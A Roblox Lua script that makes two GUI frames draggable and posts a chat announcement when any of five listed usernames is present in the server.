local function VGXONZ_fake_script() -- Frame.MguiD
    local script = Instance.new("LocalScript", Frame)

    local UserInputService = game:GetService("UserInputService")

    local gui = script.Parent

    local dragging
    local dragInput
    local dragStart
    local startPos

    local function update(input)
        local delta = input.Position - dragStart
        gui.Position =
            UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    gui.InputBegan:Connect(
        function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = gui.Position

                input.Changed:Connect(
                    function()
                        if input.UserInputState == Enum.UserInputState.End then
                            dragging = false
                        end
                    end
                )
            end
        end
    )

    gui.InputChanged:Connect(
        function(input)
            if
                input.UserInputType == Enum.UserInputType.MouseMovement or
                    input.UserInputType == Enum.UserInputType.Touch
             then
                dragInput = input
            end
        end
    )

    UserInputService.InputChanged:Connect(
        function(input)
            if input == dragInput and dragging then
                update(input)
            end
        end
    )
end
coroutine.wrap(VGXONZ_fake_script)()
local function EAZWOTE_fake_script() -- SCv2_ButtonList.MguiD
    local script = Instance.new("LocalScript", SCv2_ButtonList)

    local UserInputService = game:GetService("UserInputService")

    local gui = script.Parent

    local dragging
    local dragInput
    local dragStart
    local startPos

    local function update(input)
        local delta = input.Position - dragStart
        gui.Position =
            UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    gui.InputBegan:Connect(
        function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = gui.Position

                input.Changed:Connect(
                    function()
                        if input.UserInputState == Enum.UserInputState.End then
                            dragging = false
                        end
                    end
                )
            end
        end
    )

    gui.InputChanged:Connect(
        function(input)
            if
                input.UserInputType == Enum.UserInputType.MouseMovement or
                    input.UserInputType == Enum.UserInputType.Touch
             then
                dragInput = input
            end
        end
    )

    UserInputService.InputChanged:Connect(
        function(input)
            if input == dragInput and dragging then
                update(input)
            end
        end
    )
end
coroutine.wrap(EAZWOTE_fake_script)()


function say(msg)
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
end

local devcommand = {"eo8q", "cookieispublicxrip", "crumschat", "thekillercrum", "timzjs"}

for a,b in pairs(game.Players:GetPlayers())do
    for c,d in pairs(devcommand)do
        if b.Name == d then
            say("Developer Has Joined! ("..b.Name..")")
        end
    end
end
